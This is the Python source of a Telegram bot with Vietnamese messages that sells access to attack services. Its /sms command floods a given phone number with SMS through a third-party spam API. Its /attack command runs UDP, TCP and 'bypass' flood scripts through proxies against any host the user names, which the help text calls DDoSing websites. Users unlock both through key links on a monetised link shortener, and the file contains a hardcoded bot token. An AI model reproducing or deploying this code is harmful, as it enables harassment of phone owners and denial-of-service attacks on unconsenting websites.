import datetime
import hashlib
import io
import os
import re
import socket
import sqlite3
import subprocess
import threading
import time
import zipfile

import psutil
import requests
import telebot

# === Bot config ===
bot_token = '8075150737:AAGiXi9V8OGXZqIGdS5e6Q8h5iEaB9GCsaI'
ADMIN_ID = 7534950201
allowed_group_id = -1002535925512

bot = telebot.TeleBot(bot_token)
allowed_users = []
cooldown_dict = {}
is_bot_active = True
start_time = time.time()

# === SQLite DB setup ===
connection = sqlite3.connect('user_data.db', check_same_thread=False)
cursor = connection.cursor()
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

# === Utility ===
def TimeStamp():
    return str(datetime.date.today())

def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    for user_id, exp_time in cursor.fetchall():
        if datetime.datetime.strptime(exp_time, '%Y-%m-%d %H:%M:%S') > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(user_id, expiration_time):
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()

load_users_from_database()

# === Admin / Add user ===
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, 'Chi danh cho Admin.')

    parts = message.text.split()
    if len(parts) != 2 or not parts[1].isdigit():
        return bot.reply_to(message, 'Dung dinh dang: /add [id]')

    user_id = int(parts[1])
    expiration = datetime.datetime.now() + datetime.timedelta(days=30)
    allowed_users.append(user_id)
    save_user_to_database(user_id, expiration)
    bot.reply_to(message, f'Đa them user {user_id} dung lenh trong 30 ngay.')

# === Key system ===
@bot.message_handler(commands=['getkey'])
def getkey(message):
    username = message.from_user.username
    raw = f'GL-{username}+{TimeStamp()}'
    key = hashlib.md5(raw.encode()).hexdigest()

    try:
        r = requests.get('https://link4m.co/st?api=68212942c9a9380c6e353eda&url=tungdzvcl113.com')
        url_key = r.json().get('shortenedUrl', 'Lay Key Loi...')
    except:
        url_key = 'Lay Key Loi...'

    reply = (
        "- Cam On Ban Da GetKey -\n"
        f"- Link Lay Key: {url_key}\n"
        "- Nhap Key Bang Lenh /key + [key]\n"
        "[Luu y: moi key chi dung cho 1 nguoi]"
    )
    bot.reply_to(message, reply)

@bot.message_handler(commands=['key'])
def verify_key(message):
    user_id = message.from_user.id
    parts = message.text.split()
    if len(parts) != 2:
        return bot.reply_to(message, 'Sai cu phap. Dung: /key [key]')

    username = message.from_user.username
    expected = hashlib.md5(f'GL-{username}+{TimeStamp()}'.encode()).hexdigest()
    
    if parts[1] == expected:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Key hop le. Đa kich hoat.')
    else:
        bot.reply_to(message, 'Key sai hoac het han.')

# === SMS spam ===
@bot.message_handler(commands=['sms'])
def spam_sms(message):
    user_id = message.from_user.id
    if not is_bot_active:
        return bot.reply_to(message, 'Bot hien đang tat.')
    
    if user_id not in allowed_users:
        return bot.reply_to(message, 'Vui long nhap key bang /getkey va /key')

    args = message.text.split()
    if len(args) != 2:
        return bot.reply_to(message, 'Sai cu phap. Vi du: /sms 0987654321')

    phone = args[1]
    if phone in ['113', '114', '115', '911', '0376349783']:
        return bot.reply_to(message, 'Khong đuoc spam so nay.')

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remain = int(90 - (time.time() - cooldown_dict[user_id]))
        return bot.reply_to(message, f'Vui long đoi {remain}s đe spam tiep.')

    cooldown_dict[user_id] = time.time()
    bot.reply_to(message, f'Đang spam so: {phone}')
    try:
        requests.get(f"https://api.viduchung.info/spam-sms/?phone={phone}")
        bot.reply_to(message, 'Spam thanh cong!')
    except:
        bot.reply_to(message, 'Gui yeu cau spam that bai.')

# === Attack Command ===
def run_attack(command, duration, message):
    process = subprocess.Popen(command)
    time.sleep(duration)
    process.terminate()
    bot.reply_to(message, "Đa dung tan cong.")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        return bot.reply_to(message, 'Bot đang tat.')

    if user_id not in allowed_users:
        return bot.reply_to(message, 'Vui long nhap key.')

    args = message.text.split()
    if len(args) < 3:
        return bot.reply_to(message, 'Sai cu phap: /attack [method] [host] (port)')

    method, host = args[1].upper(), args[2]
    port = args[3] if len(args) >= 4 else None

    if method == 'BYPASS':
        command = ["node", "bypass.js", host, "150", "64", "5", "proxy.txt"]
        duration = 150
    elif method == 'UDP-FLOOD' and port:
        command = ["python3", "udp.py", host, port]
        duration = 60
    elif method == 'TCP-FLOOD' and port:
        command = ["python3", "tcp.py", host, port]
        duration = 60
    else:
        return bot.reply_to(message, 'Phuong thuc khong hop le hoac thieu port.')

    threading.Thread(target=run_attack, args=(command, duration, message)).start()
    bot.reply_to(message, f'Tan cong {host} trong {duration}s bang {method}.')

# === Proxy Tools ===
@bot.message_handler(commands=['proxy'])
def proxy_info(message):
    if message.from_user.id not in allowed_users:
        return bot.reply_to(message, 'Ban khong co quyen.')

    try:
        with open("proxy.txt", "r") as f:
            count = len(f.readlines())
        bot.reply_to(message, f"So proxy hien co: {count}")
    except:
        bot.reply_to(message, "Khong tim thay proxy.txt")

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    if message.from_user.id not in allowed_users:
        return bot.reply_to(message, 'Ban khong co quyen.')

    try:
        with open("proxy.txt", "r") as f:
            count = len(f.readlines())
        bot.send_message(message.chat.id, f"Co {count} proxy đa cap nhat.")
        bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
    except:
        bot.reply_to(message, "Khong tim thay proxy.txt")

# === Admin tools ===
@bot.message_handler(commands=['cpu'])
def cpu_info(message):
    if message.from_user.id != ADMIN_ID:
        return bot.reply_to(message, 'Ban khong co quyen.')
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory().percent
    bot.reply_to(message, f'CPU: {cpu}% | RAM: {mem}%')

@bot.message_handler(commands=['on'])
def bot_on(message):
    global is_bot_active
    if message.from_user.id == ADMIN_ID:
        is_bot_active = True
        bot.reply_to(message, 'Bot đa bat lai.')

@bot.message_handler(commands=['off'])
def bot_off(message):
    global is_bot_active
    if message.from_user.id == ADMIN_ID:
        is_bot_active = False
        bot.reply_to(message, 'Bot đa tat.')

# === Thoi gian hoat đong ===
@bot.message_handler(commands=['time'])
def uptime(message):
    uptime = int(time.time() - start_time)
    h = uptime // 3600
    m = (uptime % 3600) // 60
    s = uptime % 60
    bot.reply_to(message, f"Bot đa hoat đong: {h} gio {m} phut {s} giay.")

# === Tro giup ===
@bot.message_handler(commands=['help', 'start'])
def help_msg(message):
    help_text = '''
📌 Danh sach lenh:
- /getkey : Lay key su dung
- /key [key] : Kich hoat key
- /sms [so] : Spam SMS
- /attack [method] [host] (port) : DDoS website
- /methods : Xem cac phuong thuc
- /proxy : Xem so luong proxy
- /getproxy : Tai file proxy
- /time : Xem thoi gian hoat đong
- /admin : Lien he Admin
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['admin'])
def admin_info(message):
    bot.reply_to(message, "Lien he admin tai: t.me/gioihocdev")

@bot.message_handler(func=lambda m: m.text.startswith('/'))
def unknown(message):
    bot.reply_to(message, "Lenh khong hop le. Dung /help đe xem danh sach lenh.")

# === Start polling ===
bot.infinity_polling()
